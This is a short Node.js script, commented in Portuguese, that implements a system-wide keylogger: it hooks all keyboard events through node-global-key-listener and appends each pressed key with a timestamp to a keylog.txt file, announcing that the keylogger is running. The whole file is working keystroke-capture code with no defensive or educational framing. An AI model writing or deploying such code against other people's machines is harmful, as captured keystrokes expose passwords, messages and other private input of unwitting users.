const fs = require("fs");
const path = require("path");
const { GlobalKeyboardListener } = require("node-global-key-listener");

// Caminho para salvar o log
const logFilePath = path.join(__dirname, "documentos", "keylog.txt");

// Função para registrar a tecla pressionada no arquivo
function logKey(keyName) {
  const logEntry = `Key: ${keyName} pressed at ${new Date().toISOString()}\n`;
  fs.appendFile(logFilePath, logEntry, (err) => {
    if (err) throw err;
  });
}

// Instanciando o listener global de teclado
const keyboardListener = new GlobalKeyboardListener();

// Capturando os eventos de teclas pressionadas
keyboardListener.addListener((event) => {
  // Só registra a tecla se ela for pressionada
  if (event.state === "DOWN") {
    logKey(event.name);
  }
});

console.log("Keylogger rodando. Pressione teclas para registrar no arquivo keylog.txt.");
